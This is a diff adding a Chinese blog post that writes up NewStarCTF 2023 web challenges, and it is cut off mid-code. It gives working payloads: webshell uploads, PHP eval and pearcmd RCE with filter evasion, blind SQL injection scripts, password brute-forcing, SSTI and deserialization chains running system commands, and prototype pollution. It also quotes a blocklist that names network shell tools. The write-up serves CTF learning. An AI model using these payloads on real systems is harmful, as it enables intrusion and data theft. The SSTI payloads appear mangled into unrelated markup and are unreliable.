@@ -1,0 +1,2598 @@
++++
+title = "NewStarCTF wp"
+date = 2023-04-15
+updated = 2025-06-09
+[taxonomies]
+categories = ["杂项", "ctf"]
+tags = ["engineer"]
+[extra]
+lang = "zh"
+toc = true
+comment = true
+math = true
+mermaid = true
++++
+
+# NewStarCTF 2023
+
+## Web
+
+### [Week 1]泄漏的秘密
+
+通过使用 dirsearch 扫描可以得到两个文件可访问 `robots.txt` 和 `www.zip` 。
+
+robots.txt 内容如下
+
+Copy
+
+```
+PART ONE: flag{r0bots_1s_s0_us3ful
+```
+
+www.zip/index.php 内容如下
+
+Copy
+
+```
+<?php
+$PART_TWO = "_4nd_www.zip_1s_s0_d4ng3rous}";
+echo "<h1>粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！</h1>";
+```
+
+即可得到 flag 如下
+
+Copy
+
+```
+flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}
+```
+
+### [Week 1]Begin of Upload
+
+通过查看源代码可以发现使用的是前端过滤，通过在浏览器中禁止 JavaScript 后即可直接上传 shell 文件。
+
+![image-20240426220850911](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240426220850911.png)
+
+通过蚁剑一把梭即可得到 flag（文件在 /fllll4g）。
+
+Copy
+
+```
+flag{1b60e33c-182d-4a44-901a-549b43a7a66e}
+```
+
+### [Week 1]Begin of HTTP
+
+#### **0x00 GET**
+
+Copy
+
+```
+请使用 GET方式 来给 ctf 参数传入任意值来通过这关
+```
+
+通过 param 传入 ctf 参数即可，如下
+
+Copy
+
+```
+http://node4.buuoj.cn:29844/?ctf=123
+```
+
+#### **0x01 POST**
+
+Copy
+
+```
+很棒，如果我还想让你以POST方式来给我传递 secret 参数你又该如何处理呢？ 
+如果你传入的参数值并不是我想要的secret，我也不会放你过关的 或许你可以找一找我把secret藏在了哪里
+```
+
+查看源代码可以发现
+
+Copy
+
+```
+<!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->
+```
+
+通过 base64 解密可以得到 Secret 值为 `n3wst4rCTF2023g00000d` ，通过 body 传入即可。
+
+Copy
+
+```
+secret=n3wst4rCTF2023g00000d
+```
+
+#### **0x02 Cookie**
+
+Copy
+
+```
+很强，现在我需要验证你的 power 是否是 ctfer ，只有ctfer可以通过这关
+```
+
+通过设置 Cookie 如下
+
+Copy
+
+```
+Cookie: power=ctfer
+```
+
+#### **0x03 User-Agent**
+
+Copy
+
+```
+你已经完成了本题过半的关卡，现在请使用 NewStarCTF2023浏览器 来通过这关！
+```
+
+通过设置 User-Agent 如下
+
+Copy
+
+```
+User-Agent: NewStarCTF2023
+```
+
+#### **0x04 Referer**
+
+Copy
+
+```
+希望你是从 newstarctf.com 访问到这个关卡的
+```
+
+通过设置 Referer 如下
+
+Copy
+
+```
+Referer: newstarctf.com
+```
+
+#### **0x05 X-Real-Ip**
+
+Copy
+
+```
+最后一关了！只有 本地用户 可以通过这一关
+```
+
+通过设置 X-Real-Ip 如下
+
+Copy
+
+```
+X-Real-Ip: 127.0.0.1
+```
+
+就可以得到 flag 了。
+
+### [Week 1]ErrorFlask
+
+通过题目得知需要从 Flask 中的报错中寻找答案，网页回显如下
+
+Copy
+
+```
+give me number1 and number2,i will help you to add
+```
+
+通过输入字符串类型的值即可得到报错，Payload 如下
+
+Copy
+
+```
+?number1=a&number2=b
+```
+
+得到回显后点击 `return "not ssti,flag in source code~"+str(int(num1)+int(num2))` 即可得到 flag ，不方便复制可以 F12 来复制。
+
+Copy
+
+```
+flag = "flag{Y0u_@re_3enset1ve_4bout_deb8g}"
+```
+
+### [Week 1]Begin of PHP
+
+Copy
+
+```
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+if(isset($_GET['key1']) && isset($_GET['key2'])){
+    echo "=Level 1=<br>";
+    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
+        $flag1 = True;
+    }else{
+        die("nope,this is level 1");
+    }
+}
+
+if($flag1){
+    echo "=Level 2=<br>";
+    if(isset($_POST['key3'])){
+        if(md5($_POST['key3']) === sha1($_POST['key3'])){
+            $flag2 = True;
+        }
+    }else{
+        die("nope,this is level 2");
+    }
+}
+
+if($flag2){
+    echo "=Level 3=<br>";
+    if(isset($_GET['key4'])){
+        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
+            $flag3 = True;
+        }else{
+            die("nope,this is level 3");
+        }
+    }
+}
+
+if($flag3){
+    echo "=Level 4=<br>";
+    if(isset($_GET['key5'])){
+        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
+            $flag4 = True;
+        }else{
+            die("nope,this is level 4");
+        }
+    }
+}
+
+if($flag4){
+    echo "=Level 5=<br>";
+    extract($_POST);
+    foreach($_POST as $var){
+        if(preg_match("/[a-zA-Z0-9]/",$var)){
+            die("nope,this is level 5");
+        }
+    }
+    if($flag5){
+        echo file_get_contents("/flag");
+    }else{
+        die("nope,this is level 5");
+    }
+}
+```
+
+#### **0x00 Level 1**
+
+md5 绕过，可以通过数组进行绕过，Payload 如下
+
+Copy
+
+```
+key1[]=1&key2[]=2
+```
+
+#### **0x01 Level 2**
+
+md5 === sha1 绕过，同样可以通过数组进行绕过，Payload 如下（Level 5 中不允许 POST 的值出现任何数字或字母）
+
+Copy
+
+```
+key3[]=@
+```
+
+#### **0x02 Level 3**
+
+strcmp 函数绕过，同样可以通过数组进行绕过，Payload 如下
+
+Copy
+
+```
+key1[]=1&key2[]=2&key4[]=4
+```
+
+#### **0x03 Level 4**
+
+is_numeric 函数绕过，将 key5 设置为 2024a(任意字符) 即可，Payload 如下
+
+Copy
+
+```
+key1[]=1&key2[]=2&key4[]=4&key5=2024a
+```
+
+#### **0x04 Level 5**
+
+`extract($_POST);` 函数相当于 `$name = $_POST['name']` 。
+
+通过发现缺少了 flag5 变量，说明就需要通过以上方法来造出 flag5，又因为 POST 的值出现任何数字或字母，根据在 PHP 中，只要字符串不为空即为 `True` 的特性，故 Payload 如下
+
+Copy
+
+```
+key3[]=@&flag5=@
+```
+
+即可得到 flag。
+
+### [Week 1]R!C!E!
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
+    $password=md5($_POST['password']);
+    $code=$_POST['e_v.a.l'];
+    if(substr($password,0,6)==="c4d038"){
+        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
+            eval($code);
+        }
+    }
+}
+```
+
+本题需要知道 GET 或 POST 变量名中的非法字符会转化下划线，即 `$_POST['e_v.a.l']` 需要通过 `e[.v.a.l` 来传入。
+
+并且题目中还存在一个 password，该参数会进行 md5 加密并对比前 6 位需要与 `c4d038` 一致，可以通过写脚本进行爆破。
+
+Copy
+
+```
+import hashlib
+
+for i in range(0, 99999999):
+    if hashlib.md5(str(i).encode(encoding='utf-8')).hexdigest()[:6] == "c4d038":
+        print(i)
+        break
+        
+# 114514
+```
+
+题目还对部分常见的恶意函数进行了过滤，但是可以通过 反引号 来执行 shell 命令，也可以通过 反斜杠 来进行绕过，Payload 如下
+
+Copy
+
+```
+password=114514&e[v.a.l=echo `l\s /`;
+```
+
+可以得到回显如下
+
+Copy
+
+```
+bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
+```
+
+构造 Payload 如下即可得到 flag
+
+Copy
+
+```
+password=114514&e[v.a.l=echo `tac /fl\ag`;
+```
+
+### [Week 1]EasyLogin
+
+随意注册一个账号后登录会进入终端，但在 BurpSuite 中可以发现还有一个特别的请求如下
+
+Copy
+
+```
+POST /passport/f9e41a08a6eb869b894f509c4108adcf2213667fe2059d896886c5943156c7bc.php
+```
+
+该请求的回显如下
+
+Copy
+
+```
+<!-- 恭喜你找到flag -->
+<!-- flag 为下方链接中视频简介第7行开始至第10行的全部小写字母和数字 -->
+<!-- https://b23.tv/BV1SD4y1J7uY -->
+<!-- 庆祝一下吧！ -->
+```
+
+很显然，点进去一看是个诈骗 flag，继续研究终端的 JavaScript 源码发现这个终端是个虚假的终端，但在其中还能发现一个 `admin` 账号，并且存在一个提示 `Maybe you need BurpSuite.` ，看来用 bp 这方向没错，那就开始爆破寻找 `admin` 账号的密码。
+
+![image-20240426221001035](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240426221001035.png)
+
+从图中已知输入的密码会进行 md5 加密，通过编写 Python 脚本进行爆破，我这里爆破用的是 rockyou.txt ，可以在 Kali 中找到。
+
+Copy
+
+```
+import requests
+
+with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as file:
+    for line in file:
+        line = line.strip()
+        data = {"un": "admin", "pw": f"{hashlib.md5(str(line).encode(encoding='utf-8')).hexdigest()}", "rem": "0"}
+        ret = requests.post('http://node4.buuoj.cn:25956/signin.php', data=data)
+        if 'div class="alert alert-success show' in ret.text:
+            print(line)
+            break
+            
+# 000000 
+```
+
+通过将得到的密码手动再进行一次登录操作，就可以得到 flag 了。
+
+![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FSZBKI9H4CFQIpo8DnMmb%252FEasyLogin-2.png%3Falt%3Dmedia%26token%3Da2717860-f453-4123-84e5-52e3d531a53c&width=768&dpr=4&quality=100&sign=57c12f595f0a2ee071ca8354b68fdcb92829de9b1ac09e020d1f915be2e09ccb)
+
+### [Week 2]include 0。0
+
+Copy
+
+```
+file=php://filter/read=convert.%2562ase64-encode/resource=flag.php
+```
+
+### [Week 2]Unserialize？
+
+Copy
+
+```
+unser=O:4:"evil":1:{s:3:"cmd";s:35:"c\at /th1s_1s_fffflllll4444aaaggggg";}
+```
+
+### [Week 2]Upload again!
+
+#### .htaccess 绕过、`<?` 绕过
+
+Copy
+
+```
+<FilesMatch "shell.jpg">
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+### [Week 2]R!!C!!E!!
+
+Copy
+
+```
+/bo0g1pop.php?star=eval(array_rand(array_flip(getallheaders())));
+User-Agent: system("cat /flag");
+```
+
+### [Week 2]游戏高手
+
+进入 Console
+
+Copy
+
+```
+gameScore=999999999999999
+```
+
+运行玩游戏直接白给就可以得到 flag 了。
+
+### [Week 2]ez_sql
+
+Copy
+
+```
+$ python sqlmap.py -u http://ba57bf2c-be27-41e7-b824-792bf7347c7f.node4.buuoj.cn:81/?id=TMP0919 -D ctf --tables --dump-all
+```
+
+可以爆破数据库名字为 `ctf` ，表名 `here_is_flag` ，字段名 `flag` ，以及 flag。
+
+### [Week 3]Include 🍐
+
+这题考察的是 LFI to RCE。
+
+打开页面源代码如下
+
+Copy
+
+```
+<?php
+    error_reporting(0);
+    if(isset($_GET['file'])) {
+        $file = $_GET['file'];
+        
+        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
+            die('hacker!');
+        }
+        
+        include($file.".php");
+        # Something in phpinfo.php!
+    }
+    else {
+        highlight_file(__FILE__);
+    }
+?>
+```
+
+通过构造 payload 如下
+
+Copy
+
+```
+file=phpinfo
+```
+
+可以发现 env 存在属性 FLAG 值为 `fake{Check_register_argc_argv}` ，通过查看属性 register_argc_argv 可以发现值为 `On` 。
+
+> https://cloud.tencent.com/developer/article/2204400
+
+register_argc_argv 告诉PHP是否声明了 `argv` 和 `argc` 变量，这些变量可以是 POST 信息、也可以是 GET 信息，设置为 TRUE 时，能够通过 CLI SAPI 持续读取 argc 变量（传递给应用程序的若干参数）和 argv 变量（实际参数的数组），当我们使用 CLI SAPI 时，PHP变量 argc 和 argv 会自动填充为合适的值，并且可以在SERVER数组中找到这些值，比如 $_SERVER['argv'] 。
+
+当构造 payload `a=a+b+c` 的时候，可以通过 `var_dump($_SERVER['argv']);` 输出 `array(1){[0]=>string(3)"a=a" [1]=>string(1)"b" [2]=>string(1)"c"}` ，即通过 `+` 作为分割符。
+
+通过构造 payload 如下
+
+Copy
+
+```
+file=/usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST[1])?>+./1.php
+```
+
+可以得到回显如下
+
+Copy
+
+```
+Successfully created default configuration file "/var/www/html/1.php"
+```
+
+通过访问 `1.php` ，并构造 payload 如下即可得到 flag。
+
+Copy
+
+```
+1=system("cat /flag");
+```
+
+### [Week 3]medium_sql
+
+根据题目描述可以得出需要进行一些绕过，先查看那些关键词被过滤了。
+
+过滤关键词：union、# ，发现回显只有 `id not exists` 还有 ID 正确时的输出，故尝试布尔注入，经测试 `select、or、where、ascii` 需要进行大小写绕过。
+
+Copy
+
+```
+import requests
+import time
+
+target = "http://c14df6c5-9f87-4cfa-bd7a-9dd3bca93bf4.node4.buuoj.cn:81/"
+
+
+def getDataBase():  # 获取数据库名
+    database_name = ""
+    for i in range(1, 1000):  # 注意是从1开始，substr函数从第一个字符开始截取
+        low = 32
+        high = 127
+        mid = (low + high) // 2
+        while low < high:  # 二分法
+            params = {
+                "id": "TMP0919' And (Ascii(suBstr((sElect(database()))," + str(i) + ",1))>" + str(mid) + ")%23"
+            }
+            time.sleep(0.1)
+            r = requests.get(url=target+'?id='+params["id"])
+            if "Physics" in r.text:  # 为真时说明该字符在ascii表后面一半
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+        if low <= 32 or high >= 127:
+            break
+        database_name += chr(mid)  # 将ascii码转换为字符
+        print(database_name)
+    return "数据库名：" + database_name
+
+
+def getTable():  # 获取表名
+    column_name = ""
+    for i in range(1, 1000):
+        low = 32
+        high = 127
+        mid = (low + high) // 2
+        while low < high:
+            params = {
+                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(table_name))from(infOrmation_schema.tables)wHere(table_schema='ctf'))," + str(
+                    i) + ",1))>" + str(mid) + ")%23"
+            }
+            time.sleep(0.1)
+            r = requests.get(url=target + '?id=' + params["id"])
+            if "Physics" in r.text:
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+        if low <= 32 or high >= 127:
+            break
+        column_name += chr(mid)
+        print(column_name)
+    return "表名为：" + column_name
+
+
+def getColumn():  # 获取列名
+    column_name = ""
+    for i in range(1, 250):
+        low = 32
+        high = 127
+        mid = (low + high) // 2
+        while low < high:
+            params = {
+                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(column_name))from(infOrmation_schema.columns)wHere(table_name='here_is_flag'))," + str(
+                    i) + ",1))>" + str(mid) + ")%23"
+            }
+            time.sleep(0.1)
+            r = requests.get(url=target + '?id=' + params["id"])
+            if 'Physics' in r.text:
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+        if low <= 32 or high >= 127:
+            break
+        column_name += chr(mid)
+        print(column_name)
+    return "列名为：" + column_name
+
+
+def getFlag():  # 获取flag
+    flag = ""
+    for i in range(1, 1000):
+        low = 32
+        high = 127
+        mid = (low + high) // 2
+        while low < high:
+            params = {
+                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(flag))from(here_is_flag))," + str(i) + ",1))>" + str(mid) + ")%23"
+            }
+            time.sleep(0.1)
+            r = requests.get(url=target + '?id=' + params["id"])
+            if 'Physics' in r.text:
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+        if low <= 32 or high >= 127:
+            break
+        flag += chr(mid)
+        print(flag)
+    return "flag:" + flag
+
+
+a = getDataBase()
+b = getTable()
+c = getColumn()
+d = getFlag()
+print(a)
+print(b)
+print(c)
+print(d)
+```
+
+### [Week 3]POP Gadget
+
+源代码
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+
+class Begin{
+    public $name;
+
+    public function __destruct()
+    {
+        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
+            echo "Hello";
+        }else{
+            echo "Welcome to NewStarCTF 2023!";
+        }
+    }
+}
+
+class Then{
+    private $func;
+
+    public function __toString()
+    {
+        ($this->func)();
+        return "Good Job!";
+    }
+
+}
+
+class Handle{
+    protected $obj;
+
+    public function __call($func, $vars)
+    {
+        $this->obj->end();
+    }
+
+}
+
+class Super{
+    protected $obj;
+    public function __invoke()
+    {
+        $this->obj->getStr();
+    }
+
+    public function end()
+    {
+        die("==GAME OVER==");
+    }
+}
+
+class CTF{
+    public $handle;
+
+    public function end()
+    {
+        unset($this->handle->log);
+    }
+
+}
+
+class WhiteGod{
+    public $func;
+    public $var;
+
+    public function __unset($var)
+    {
+        ($this->func)($this->var);    
+    }
+}
+
+@unserialize($_POST['pop']);
+```
+
+POP链如下
+
+Copy
+
+```
+Begin::__destruct()->Then::__toString()->Super::__invoke()->Handle::__call($func, $vars)->CTF::end()->WhiteGod::__unset($var)
+```
+
+构造 Payload 过程如下
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+
+class Begin{
+    public $name;
+
+    public function __destruct()
+    {
+        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
+            echo "Hello";
+        }else{
+            echo "Welcome to NewStarCTF 2023!";
+        }
+    }
+}
+
+class Then{
+    private $func;
+
+    public function __construct($super)
+    {
+        $this->func = $super;
+    }
+
+    public function __toString()
+    {
+        ($this->func)();
+        return "Good Job!";
+    }
+
+}
+
+class Handle{
+    protected $obj;
+
+    public function __construct($ctf)
+    {
+        $this->obj = $ctf;
+    }
+
+    public function __call($func, $vars)
+    {
+        $this->obj->end();
+    }
+
+}
+
+class Super{
+    protected $obj;
+
+    public function __construct($handle)
+    {
+        $this->obj = $handle;
+    }
+
+    public function __invoke()
+    {
+        $this->obj->getStr();
+    }
+
+    public function end()
+    {
+        die("==GAME OVER==");
+    }
+}
+
+class CTF{
+    public $handle;
+
+    public function end()
+    {
+        unset($this->handle->log);
+    }
+
+}
+
+class WhiteGod{
+    public $func;
+    public $var;
+
+    public function __unset($var)
+    {
+        ($this->func)($this->var);
+    }
+}
+
+@unserialize($_POST['pop']);
+
+$begin = new Begin();
+$ctf = new CTF();
+$handle = new Handle($ctf);
+$super = new Super($handle);
+$begin->name = new Then($super);
+$ctf->handle = new WhiteGod();
+$ctf->handle->func = "system";
+$ctf->handle->var = "cat /flag";
+
+echo urlencode(serialize($begin));
+
+// O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D
+```
+
+### [Week 3]GenShin
+
+通过查看 Network - Headers 可以发现 Pop 属性值为 `/secr3tofpop` ，通过访问可以得到回显如下
+
+Copy
+
+```
+please give a name by get
+```
+
+通过构造 Payload 如下
+
+Copy
+
+```
+name=123
+```
+
+可以得到回显如下
+
+Copy
+
+```
+Welcome to NewstarCTF 2023 123
+```
+
+猜测应该是 Python 的 SSTI 注入，通过构造 Payload 如下
+
+Copy
+
+```
+name={{7*7}}
+```
+
+得到回显如下
+
+Copy
+
+```
+big hacker!get away from me!
+```
+
+尝试另外一种 Payload 如下
+
+Copy
+
+```
+name=<div data-gb-custom-block data-tag="print" data-0='7' data-1='7' data-2='7' data-3='7'></div>
+```
+
+可以得到回显如下
+
+Copy
+
+```
+Welcome to NewstarCTF 2023 49
+```
+
+故判断可以通过此方法继续进行 SSTI 注入，通过尝试各种关键字可以发现 `单引号, init, lipsum, url_for, 反斜杠, popen` 被过滤了。
+
+通过构造 Payload 如下
+
+Copy
+
+```
+name=
+
+<div data-gb-custom-block data-tag="print" data-0=''></div>
+```
+
+可以输出所有的子类，被过滤的关键字可以通过 `|attr()` 进行绕过，由于直接使用 eval 无法使用 chr 函数，因此需要通过在里面多套一层 eval 来实现，由于已经存在单双引号了，所以就直接全用 chr 函数来实现注入吧，生成脚本如下
+
+Copy
+
+```
+string = "__import__('os').popen('cat /flag').read()"
+output = ""
+
+for char in string:
+    output += f"chr({ord(char)})%2b"
+
+print(output)
+"""
+chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41)
+"""
+```
+
+构造 Payload 如下
+
+Copy
+
+```
+name=
+
+<div data-gb-custom-block data-tag="print" data-0='' data-1='' data-2='132' data-3='132' data-4='132' data-5='132' data-6='132' data-7='132' data-8='132' data-9='132' data-10='132' data-11='132' data-12='132' data-13='132' data-14='132' data-15='2' data-16='__in' data-17='__in' data-18='+' data-19=')|attr(' data-20='__globals__' data-21='))[' data-22='__builtins__' data-23='].eval(' data-24='95' data-25='95' data-26='95' data-27='95' data-28='95' data-29='5' data-30='2' data-31='2' data-32='2' data-33='95' data-34='95' data-35='95' data-36='5' data-37='2' data-38='2' data-39='2' data-40='105' data-41='105' data-42='5' data-43='2' data-44='2' data-45='2' data-46='109' data-47='109' data-48='9' data-49='2' data-50='2' data-51='2' data-52='112' data-53='112' data-54='12' data-55='2' data-56='2' data-57='2' data-58='111' data-59='111' data-60='11' data-61='2' data-62='2' data-63='2' data-64='114' data-65='114' data-66='14' data-67='2' data-68='2' data-69='2' data-70='116' data-71='116' data-72='16' data-73='2' data-74='2' data-75='2' data-76='95' data-77='95' data-78='95' data-79='5' data-80='2' data-81='2' data-82='2' data-83='95' data-84='95' data-85='95' data-86='5' data-87='2' data-88='2' data-89='2' data-90='40' data-91='40' data-92='40' data-93='0' data-94='2' data-95='2' data-96='2' data-97='39' data-98='39' data-99='39' data-100='9' data-101='2' data-102='2' data-103='2' data-104='111' data-105='111' data-106='11' data-107='2' data-108='2' data-109='2' data-110='115' data-111='115' data-112='15' data-113='2' data-114='2' data-115='2' data-116='39' data-117='39' data-118='39' data-119='9' data-120='2' data-121='2' data-122='2' data-123='41' data-124='41' data-125='41' data-126='1' data-127='2' data-128='2' data-129='2' data-130='46' data-131='46' data-132='46' data-133='6' data-134='2' data-135='2' data-136='2' data-137='112' data-138='112' data-139='12' data-140='2' data-141='2' data-142='2' data-143='111' data-144='111' data-145='11' data-146='2' data-147='2' data-148='2' data-149='112' data-150='112' data-151='12' data-152='2' data-153='2' data-154='2' data-155='101' data-156='101' data-157='1' data-158='2' data-159='2' data-160='2' data-161='110' data-162='110' data-163='10' data-164='2' data-165='2' data-166='2' data-167='40' data-168='40' data-169='40' data-170='0' data-171='2' data-172='2' data-173='2' data-174='39' data-175='39' data-176='39' data-177='9' data-178='2' data-179='2' data-180='2' data-181='99' data-182='99' data-183='99' data-184='9' data-185='2' data-186='2' data-187='2' data-188='97' data-189='97' data-190='97' data-191='7' data-192='2' data-193='2' data-194='2' data-195='116' data-196='116' data-197='16' data-198='2' data-199='2' data-200='2' data-201='32' data-202='32' data-203='32' data-204='2' data-205='2' data-206='2' data-207='2' data-208='47' data-209='47' data-210='47' data-211='7' data-212='2' data-213='2' data-214='2' data-215='102' data-216='102' data-217='2' data-218='2' data-219='2' data-220='2' data-221='108' data-222='108' data-223='8' data-224='2' data-225='2' data-226='2' data-227='97' data-228='97' data-229='97' data-230='7' data-231='2' data-232='2' data-233='2' data-234='103' data-235='103' data-236='3' data-237='2' data-238='2' data-239='2' data-240='39' data-241='39' data-242='39' data-243='9' data-244='2' data-245='2' data-246='2' data-247='41' data-248='41' data-249='41' data-250='1' data-251='2' data-252='2' data-253='2' data-254='46' data-255='46' data-256='46' data-257='6' data-258='2' data-259='2' data-260='2' data-261='114' data-262='114' data-263='14' data-264='2' data-265='2' data-266='2' data-267='101' data-268='101' data-269='1' data-270='2' data-271='2' data-272='2' data-273='97' data-274='97' data-275='97' data-276='7' data-277='2' data-278='2' data-279='2' data-280='100' data-281='100' data-282='0' data-283='2' data-284='2' data-285='2' data-286='40' data-287='40' data-288='40' data-289='0' data-290='2' data-291='2' data-292='2' data-293='41' data-294='41' data-295='41' data-296='1'></div>
+```
+
+即可得到 flag。
+
+### [Week 3]R!!!C!!!E!!!
+
+源代码如下
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+class minipop{
+    public $code;
+    public $qwejaskdjnlka;
+    public function __toString()
+    {
+        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
+            exec($this->code);
+        }
+        return "alright";
+    }
+    public function __destruct()
+    {
+        echo $this->qwejaskdjnlka;
+    }
+}
+if(isset($_POST['payload'])){
+    //wanna try?
+    unserialize($_POST['payload']);
+}
+```
+
+通过 exec 方法可以执行系统命令，因此这题也考的是 Linux 的命令绕过。
+
+由于引号没有进行绕过，所以可以通过引号进行关键字的绕过，构造 Payload 过程如下
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+class minipop{
+    public $code;
+    public $qwejaskdjnlka;
+    public function __toString()
+    {
+        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
+            exec($this->code);
+        }
+        return "alright";
+    }
+    public function __destruct()
+    {
+        echo $this->qwejaskdjnlka;
+    }
+}
+if(isset($_POST['payload'])){
+    //wanna try?
+    unserialize($_POST['payload']);
+}
+
+$pop = new minipop();
+$pop->qwejaskdjnlka = new minipop();
+$pop->qwejaskdjnlka->code = "cat /flag_is_h3eeere | t''ee 2";
+
+echo serialize($pop);
+// O:7:"minipop":2:{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{s:4:"code";s:30:"cat /flag_is_h3eeere | t''ee 2";s:13:"qwejaskdjnlka";N;}}
+```
+
+即可得到 flag。
+
+### [Week 3]OtenkiGirl
+
+源代码中存在 `hint.txt` 内容如下
+
+Copy
+
+```
+『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。
+---
+“请只看‘routes’文件夹。没有SQL注入。”御坂御坂满怀期待地说。
+```
+
+在 `routes/info.js` 可以发现该路由用于根据所给的 timestamp 输出该时间戳之后的所有内容。
+
+Copy
+
+```
+async function getInfo(timestamp) {
+    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
+    // Remove test data from before the movie was released
+    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
+    timestamp = Math.max(timestamp, minTimestamp);
+    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
+    return data;
+}
+```
+
+在输入 timestamp 后，上述方法会将所输入的 timestamp 与 min_public_time 进行对比，其中 `CONFIG.min_public_time` 值不存在，`DEFAULT_CONFIG.min_public_time` 值为 `2019-07-09` ，因此需要通过污染 `min_public_time` 属性才能使其输出 2019-07-09 之前的数据。
+
+minTimestamp 首先会从 `CONFIG` 中获取 `min_public_time` ，获取失败后继续再从 `DEFAULT_CONFIG` 中获取，二者的原型对象都是 `Object` 。
+
+在 `routes/submit.js` 中可以发现原型链污染点：
+
+Copy
+
+```
+// L39
+const merge = (dst, src) => {
+    if (typeof dst !== "object" || typeof src !== "object") return dst;
+    for (let key in src) {
+        if (key in dst && key in src) {
+            dst[key] = merge(dst[key], src[key]);
+        } else {
+            dst[key] = src[key];
+        }
+    }
+    return dst;
+}
+
+// L73
+const DEFAULT = {
+    date: "unknown",
+    place: "unknown"
+}
+const result = await insert2db(merge(DEFAULT, data));
+```
+
+在上述代码中，`data` 的值是可控的，能够通过 POST 请求传入。`DEFAULT` 的原型对象也是 `Object` ，因此可以通过 submit 路由来进行污染攻击。
+
+构造 Payload 如下
+
+Copy
+
+```
+{
+    "contact":"a's'd",
+    "reason":"a'd's",
+    "__proto__": {
+        "min_public_time":  "1970-01-01"
+    }
+}
+```
+
+通过访问 `/info/0` 可以得到回显得到 flag 。
+
+Copy
+
+```
+{
+    status: "success",
+    data: [
+        ...,
+        {
+            wishid: "2TrumXdm9HTH9SZvgNPaHmAx",
+            date: "2021-09-27",
+            place: "学園都市",
+            contact: "御坂美琴",
+            reason: "海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag{c2c65ecd-d8d1-4b68-8003-5e608c0dc222}です",
+            timestamp: 1190726040836
+        },
+        ...
+    ]
+}
+```
+
+### [Week 4]逃
+
+这题考察的是 PHP 反序列化逃逸。
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+function waf($str){
+    return str_replace("bad","good",$str);
+}
+
+class GetFlag {
+    public $key;
+    public $cmd = "whoami";
+    public function __construct($key)
+    {
+        $this->key = $key;
+    }
